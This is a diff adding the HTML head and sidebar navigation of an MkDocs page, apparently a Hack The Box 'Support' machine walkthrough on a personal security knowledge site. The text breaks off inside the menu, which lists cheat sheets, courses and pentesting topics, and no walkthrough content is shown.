@@ -1,0 +1,2251 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My personal knowledge repository">
+      
+      
+        <meta name="author" content="amandaguglieri">
+      
+      
+        <link rel="canonical" href="https://amandaguglieri.github.io/hackinglife/htb-support/">
+      
+      
+        <link rel="prev" href="../htb-photobomb/">
+      
+      
+        <link rel="next" href="../htb-trick/">
+      
+      <link rel="icon" href="../img/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.3">
+    
+    
+      
+        <title>Support Machine - Hacking Life</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.6b71719e.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.2505c338.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#about-the-machine" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Hacking Life" class="md-header__button md-logo" aria-label="Hacking Life" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 7v10h2v-4h2v4h2V7h-2v4h-2V7H9M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Life
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Support Machine
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </label>
+          
+        
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="light-blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/amandaguglieri/hackinglife" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    amandaguglieri/hackinglife
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Hacking Life" class="md-nav__button md-logo" aria-label="Hacking Life" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 7v10h2v-4h2v4h2V7h-2v4h-2V7H9M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z"/></svg>
+
+    </a>
+    Hacking Life
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/amandaguglieri/hackinglife" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    amandaguglieri/hackinglife
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" tabindex="0" aria-expanded="false">
+          Cheat sheets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Cheat sheets" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Cheat sheets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../amass/" class="md-nav__link">
+        amass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../apktool/" class="md-nav__link">
+        apktool
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bash/" class="md-nav__link">
+        bash
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../acronyms/" class="md-nav__link">
+        cyber acronyms
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ctr/" class="md-nav__link">
+        crt.sh
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dnscan/" class="md-nav__link">
+        dnscan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../drozer/" class="md-nav__link">
+        drozer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../emacs/" class="md-nav__link">
+        emacs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fping/" class="md-nav__link">
+        fping
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../frida/" class="md-nav__link">
+        frida
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../git/" class="md-nav__link">
+        git
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../google-dorks/" class="md-nav__link">
+        google dorks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hugo/" class="md-nav__link">
+        hugo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../i3/" class="md-nav__link">
+        i3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../impacket/" class="md-nav__link">
+        impacket
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../markdown/" class="md-nav__link">
+        markdown
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mariadb/" class="md-nav__link">
+        mariadb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../masscan/" class="md-nav__link">
+        masscan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mobsf/" class="md-nav__link">
+        mobsf
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mssql/" class="md-nav__link">
+        msSQL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mysql/" class="md-nav__link">
+        mySQL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nessus/" class="md-nav__link">
+        nessus
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../netcat/" class="md-nav__link">
+        netcat
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap/" class="md-nav__link">
+        nmap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../objection/" class="md-nav__link">
+        objection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../openssl/" class="md-nav__link">
+        openSSL
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../p0f/" class="md-nav__link">
+        p0f
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ping/" class="md-nav__link">
+        ping
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../powershell/" class="md-nav__link">
+        powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli/" class="md-nav__link">
+        sql injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlmap/" class="md-nav__link">
+        sqlmap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh-tunneling/" class="md-nav__link">
+        ssh tunneling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sublist3r/" class="md-nav__link">
+        sublist3r
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vim/" class="md-nav__link">
+        vim
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../winpeas/" class="md-nav__link">
+        winPEAS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" tabindex="0" aria-expanded="false">
+          Courses
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Courses" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Courses
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3_1" type="checkbox" id="__nav_3_1" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_1" tabindex="0" aria-expanded="false">
+          Hacking APIs
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Hacking APIs" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_1">
+          <span class="md-nav__icon md-icon"></span>
+          Hacking APIs
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/" class="md-nav__link">
+        Intro
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/apireconnaissance/" class="md-nav__link">
+        Api Reconnaissance
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/endpoint-analysis/" class="md-nav__link">
+        Endpoint Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/scanning-apis/" class="md-nav__link">
+        Scanning APIs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/api-authentication-attacks/" class="md-nav__link">
+        API authentication attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/exploiting-api-authorization/" class="md-nav__link">
+        Exploiting API Authorization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/improper-assets-management/" class="md-nav__link">
+        Improper assets management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/mass-assignment/" class="md-nav__link">
+        Mass assignment
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/server-side-request-forgery/" class="md-nav__link">
+        Server-side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/injection-attacks/" class="md-nav__link">
+        Injections attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/evasion-combining-techniques/" class="md-nav__link">
+        Evasion and combining techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackingapis/other-labs/" class="md-nav__link">
+        Labs
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ejpt/" class="md-nav__link">
+        eJPT
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" tabindex="0" aria-expanded="true">
+          Walkthroughs
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Walkthroughs" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Walkthroughs
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-metatwo/" class="md-nav__link">
+        metatwo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-photobomb/" class="md-nav__link">
+        photobomb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          support
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        support
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#about-the-machine" class="md-nav__link">
+    About the machine
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-usertxt-flag" class="md-nav__link">
+    Getting user.txt flag
+  </a>
+  
+    <nav class="md-nav" aria-label="Getting user.txt flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-port-enumeration" class="md-nav__link">
+    Service/ Port enumeration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate" class="md-nav__link">
+    Enumerate
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    Initial access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-the-systems-flag" class="md-nav__link">
+    Getting the System's flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-in-this-lab" class="md-nav__link">
+    Tools in this lab
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-i-learned" class="md-nav__link">
+    What I learned
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-trick/" class="md-nav__link">
+        trick
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" tabindex="0" aria-expanded="false">
+          Beginners' guide
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Beginners' guide" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Beginners' guide
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../checksum/" class="md-nav__link">
+        checksum
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pdm/" class="md-nav__link">
+        pdm
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../python/" class="md-nav__link">
+        python
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh-for-github/" class="md-nav__link">
+        ssh for github
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" tabindex="0" aria-expanded="false">
+          Pentesting web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pentesting web" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Pentesting web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../reverse-shells/" class="md-nav__link">
+        Reverse shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql-injection/" class="md-nav__link">
+        sql injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" tabindex="0" aria-expanded="false">
+          Network Services Pentestings
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Network Services Pentestings" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Network Services Pentestings
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../21-ftp/" class="md-nav__link">
+        21 ftp
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../23-telnet/" class="md-nav__link">
+        23 telnet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../445-smb/" class="md-nav__link">
+        445 smb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../873-rsync/" class="md-nav__link">
+        873 rsync
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1433-mssql/" class="md-nav__link">
+        1433 mssql
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3306-mariadb-mysql/" class="md-nav__link">
+        3306 mariadb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3389-rdp/" class="md-nav__link">
+        3389 RDP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5432-postgresql/" class="md-nav__link">
+        5432 postgresql
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6379-redis/" class="md-nav__link">
+        6379 redis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../27017-27018-mongodb/" class="md-nav__link">
+        27017 mongodb
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../27017-27018-mongodb/" class="md-nav__link">
+        27018 mongodb
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" tabindex="0" aria-expanded="false">
+          Pentesting mobile
